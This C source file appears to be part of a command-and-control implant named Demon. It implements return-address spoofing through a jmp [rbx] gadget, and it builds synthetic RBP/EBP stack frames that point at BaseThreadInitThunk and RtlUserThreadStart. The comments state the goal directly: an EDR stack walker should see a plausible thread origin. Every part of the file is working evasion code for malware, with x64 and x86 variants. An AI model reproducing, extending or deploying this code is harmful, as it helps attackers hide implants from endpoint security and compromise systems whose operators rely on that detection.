#include <Demon.h>

#include <core/Spoof.h>
#include <core/MiniStd.h>
#include <core/SysNative.h>
#include <core/Win32.h>
#include <common/Macros.h>

#if _WIN64

PVOID SpoofRetAddr(
    _In_    PVOID  Module,
    _In_    ULONG  Size,
    _In_    HANDLE Function,
    _Inout_ PVOID  a,
    _Inout_ PVOID  b,
    _Inout_ PVOID  c,
    _Inout_ PVOID  d,
    _Inout_ PVOID  e,
    _Inout_ PVOID  f,
    _Inout_ PVOID  g,
    _Inout_ PVOID  h
) {
    PVOID Trampoline = { 0 };
    BYTE  Pattern[]  = { 0xFF, 0x23 };
    PRM   Param      = { NULL, NULL, NULL };

    if ( Function != NULL ) {
        Trampoline = MmGadgetFind(
            C_PTR( U_PTR( Module ) + LDR_GADGET_HEADER_SIZE ),
            U_PTR( Size ),
            Pattern,
            sizeof( Pattern )
        );

        /* set params */
        Param.Trampoline = Trampoline;
        Param.Function   = Function;

        if ( Trampoline != NULL ) {
            return ( ( PVOID( * ) ( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID ) ) ( ( PVOID ) Spoof ) ) ( a, b, c, d, &Param, NULL, e, f, g, h );
        }
    }

    return NULL;
}

/*
 * ARC-02: Synthetic call-stack frames
 *
 * Resolves kernel32!BaseThreadInitThunk and ntdll!RtlUserThreadStart via the
 * export table, then allocates a shadow stack region and writes synthetic
 * RBP-chain frames so that an EDR stack walker sees a plausible thread origin.
 *
 * Shadow stack layout (addresses decrease toward the top):
 *
 *   Frame 0 (outermost — RtlUserThreadStart):
 *     [RBP_0]     = 0            (end of chain)
 *     [RBP_0 + 8] = RtlUserThreadStart + SYNTH_OFFSET_RUTS
 *
 *   Frame 1 (BaseThreadInitThunk):
 *     [RBP_1]     = &RBP_0      (chain to frame 0)
 *     [RBP_1 + 8] = BaseThreadInitThunk + SYNTH_OFFSET_BTIT
 *
 *   Frame 2 (innermost — our call site):
 *     [RBP_2]     = &RBP_1      (chain to frame 1)
 *     [RBP_2 + 8] = (unused — WaitForSingleObjectEx writes its own ret)
 *     <32-byte shadow home space>
 *     <--- ShadowRsp points here
 */

BOOL SynthStackInit(
    _Inout_ PSYNTH_STACK_CTX Ctx
) {
    PVOID  Kernel32Base = NULL;
    PVOID  NtdllBase    = NULL;
    PVOID  BtitAddr     = NULL;
    PVOID  RutsAddr     = NULL;
    PVOID  ShadowBase   = NULL;
    SIZE_T ShadowSize   = SYNTH_SHADOW_SIZE;

    if ( Ctx->Ready ) {
        return TRUE;
    }

    MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX ) );

    /* resolve module bases from the global Instance */
    Kernel32Base = Instance->Modules.Kernel32;
    NtdllBase    = Instance->Modules.Ntdll;

    if ( ! Kernel32Base || ! NtdllBase ) {
        PUTS( "[ARC-02] kernel32 or ntdll base not resolved" )
        return FALSE;
    }

    /* resolve export addresses */
    BtitAddr = LdrFunctionAddr( Kernel32Base, H_FUNC_BASETHREADINITTHUNK );
    RutsAddr = LdrFunctionAddr( NtdllBase,    H_FUNC_RTLUSERTHREADSTART  );

    if ( ! BtitAddr || ! RutsAddr ) {
        PUTS( "[ARC-02] Failed to resolve BaseThreadInitThunk or RtlUserThreadStart" )
        return FALSE;
    }

    /* store the return-site addresses (function + known offset) */
    Ctx->BaseThreadInitThunkRet = C_PTR( U_PTR( BtitAddr ) + SYNTH_OFFSET_BTIT );
    Ctx->RtlUserThreadStartRet  = C_PTR( U_PTR( RutsAddr ) + SYNTH_OFFSET_RUTS );

    PRINTF( "[ARC-02] BTIT ret = %p, RUTS ret = %p\n",
            Ctx->BaseThreadInitThunkRet, Ctx->RtlUserThreadStartRet )

    /* allocate the shadow stack region (RW, not executable) */
    ShadowBase = NULL;
    if ( ! NT_SUCCESS( SysNtAllocateVirtualMemory(
            NtCurrentProcess(), &ShadowBase, 0,
            &ShadowSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
    {
        PUTS( "[ARC-02] Shadow stack allocation failed" )
        return FALSE;
    }

    Ctx->ShadowBase = ShadowBase;
    Ctx->ShadowSize = ShadowSize;
    Ctx->Ready      = TRUE;

    PRINTF( "[ARC-02] Shadow stack @ %p (size 0x%lx)\n", ShadowBase, ShadowSize )

    return TRUE;
}

VOID SynthStackFree(
    _Inout_ PSYNTH_STACK_CTX Ctx
) {
    if ( Ctx->ShadowBase ) {
        SIZE_T FreeSize = 0;
        SysNtFreeVirtualMemory( NtCurrentProcess(), &Ctx->ShadowBase, &FreeSize, MEM_RELEASE );
    }
    MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX ) );
}

BOOL SynthStackPrepare(
    _Inout_ PSYNTH_STACK_CTX Ctx
) {
    PUINT_PTR Stack = NULL;

    if ( ! Ctx->Ready || ! Ctx->ShadowBase ) {
        return FALSE;
    }

    /* zero the shadow region before each use */
    MemSet( Ctx->ShadowBase, 0, Ctx->ShadowSize );

    /*
     * Build frames from the top (highest address) of the shadow allocation
     * downward, exactly as the real stack grows.
     *
     * Each frame is two pointer-sized slots:
     *   [+0x00] saved RBP  (points to the previous frame)
     *   [+0x08] return address
     *
     * We leave 0x100 bytes of headroom at the very top for alignment and
     * to avoid writing at the exact boundary.
     */
    Stack = (PUINT_PTR)( U_PTR( Ctx->ShadowBase ) + Ctx->ShadowSize - 0x100 );

    /* ---- Frame 0: ntdll!RtlUserThreadStart (outermost) ---- */
    /* Align to 16 bytes */
    Stack = (PUINT_PTR)( U_PTR( Stack ) & ~(UINT_PTR)0xF );

    PUINT_PTR Frame0Rbp = Stack - 2;
    Frame0Rbp[ 0 ] = 0;                                        /* saved RBP = NULL (end of chain) */
    Frame0Rbp[ 1 ] = U_PTR( Ctx->RtlUserThreadStartRet );      /* return addr */

    /* ---- Frame 1: kernel32!BaseThreadInitThunk ---- */
    PUINT_PTR Frame1Rbp = Frame0Rbp - 2;
    Frame1Rbp[ 0 ] = U_PTR( Frame0Rbp );                       /* chain to frame 0 */
    Frame1Rbp[ 1 ] = U_PTR( Ctx->BaseThreadInitThunkRet );     /* return addr */

    /* ---- Frame 2: our synthetic call site (innermost) ---- */
    PUINT_PTR Frame2Rbp = Frame1Rbp - 2;
    Frame2Rbp[ 0 ] = U_PTR( Frame1Rbp );                       /* chain to frame 1 */
    Frame2Rbp[ 1 ] = U_PTR( Ctx->BaseThreadInitThunkRet );     /* return addr (plausible) */

    /* RSP sits below frame 2 with a 32-byte shadow home space for the callee */
    Ctx->ShadowRbp = C_PTR( Frame2Rbp );
    Ctx->ShadowRsp = C_PTR( U_PTR( Frame2Rbp ) - 0x28 );      /* 0x20 home + 0x08 alignment */

    PRINTF( "[ARC-02] Prepared: RSP=%p  RBP=%p  F0=%p  F1=%p  F2=%p\n",
            Ctx->ShadowRsp, Ctx->ShadowRbp, Frame0Rbp, Frame1Rbp, Frame2Rbp )

    return TRUE;
}

#else /* !_WIN64 — x86 implementation */

BOOL SynthStackInit86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
) {
    PVOID  Kernel32Base = NULL;
    PVOID  NtdllBase    = NULL;
    PVOID  BtitAddr     = NULL;
    PVOID  RutsAddr     = NULL;
    PVOID  ShadowBase   = NULL;
    SIZE_T ShadowSize   = SYNTH_SHADOW_SIZE;

    if ( Ctx->Ready ) {
        return TRUE;
    }

    MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX_X86 ) );

    Kernel32Base = Instance->Modules.Kernel32;
    NtdllBase    = Instance->Modules.Ntdll;

    if ( ! Kernel32Base || ! NtdllBase ) {
        PUTS( "[ARC-02/x86] kernel32 or ntdll base not resolved" )
        return FALSE;
    }

    BtitAddr = LdrFunctionAddr( Kernel32Base, H_FUNC_BASETHREADINITTHUNK );
    RutsAddr = LdrFunctionAddr( NtdllBase,    H_FUNC_RTLUSERTHREADSTART  );

    if ( ! BtitAddr || ! RutsAddr ) {
        PUTS( "[ARC-02/x86] Failed to resolve BaseThreadInitThunk or RtlUserThreadStart" )
        return FALSE;
    }

    Ctx->BaseThreadInitThunkRet = C_PTR( U_PTR( BtitAddr ) + SYNTH_OFFSET_BTIT );
    Ctx->RtlUserThreadStartRet  = C_PTR( U_PTR( RutsAddr ) + SYNTH_OFFSET_RUTS );

    ShadowBase = NULL;
    if ( ! NT_SUCCESS( SysNtAllocateVirtualMemory(
            NtCurrentProcess(), &ShadowBase, 0,
            &ShadowSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
    {
        PUTS( "[ARC-02/x86] Shadow stack allocation failed" )
        return FALSE;
    }

    Ctx->ShadowBase = ShadowBase;
    Ctx->ShadowSize = ShadowSize;
    Ctx->Ready      = TRUE;

    return TRUE;
}

VOID SynthStackFree86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
) {
    if ( Ctx->ShadowBase ) {
        SIZE_T FreeSize = 0;
        SysNtFreeVirtualMemory( NtCurrentProcess(), &Ctx->ShadowBase, &FreeSize, MEM_RELEASE );
    }
    MemSet( Ctx, 0, sizeof( SYNTH_STACK_CTX_X86 ) );
}

BOOL SynthStackPrepare86(
    _Inout_ PSYNTH_STACK_CTX_X86 Ctx
) {
    PUINT_PTR Stack = NULL;

    if ( ! Ctx->Ready || ! Ctx->ShadowBase ) {
        return FALSE;
    }

    MemSet( Ctx->ShadowBase, 0, Ctx->ShadowSize );

    /*
     * x86 EBP chain: each frame is two DWORD-sized slots.
     * Layout mirrors x64 but with 4-byte pointers.
     */
    Stack = (PUINT_PTR)( U_PTR( Ctx->ShadowBase ) + Ctx->ShadowSize - 0x80 );

    /* Align to 4 bytes */
    Stack = (PUINT_PTR)( U_PTR( Stack ) & ~(UINT_PTR)0x3 );

    /* Frame 0: RtlUserThreadStart (outermost) */
    PUINT_PTR Frame0Ebp = Stack - 2;
    Frame0Ebp[ 0 ] = 0;
    Frame0Ebp[ 1 ] = U_PTR( Ctx->RtlUserThreadStartRet );

    /* Frame 1: BaseThreadInitThunk */
    PUINT_PTR Frame1Ebp = Frame0Ebp - 2;
    Frame1Ebp[ 0 ] = U_PTR( Frame0Ebp );
    Frame1Ebp[ 1 ] = U_PTR( Ctx->BaseThreadInitThunkRet );

    /* Frame 2: our call site */
    PUINT_PTR Frame2Ebp = Frame1Ebp - 2;
    Frame2Ebp[ 0 ] = U_PTR( Frame1Ebp );
    Frame2Ebp[ 1 ] = U_PTR( Ctx->BaseThreadInitThunkRet );

    Ctx->ShadowEbp = C_PTR( Frame2Ebp );
    /* ESP below frame 2 with space for stdcall args (3 args * 4 bytes + return addr) */
    Ctx->ShadowEsp = C_PTR( U_PTR( Frame2Ebp ) - 0x14 );

    return TRUE;
}

#endif /* _WIN64 */
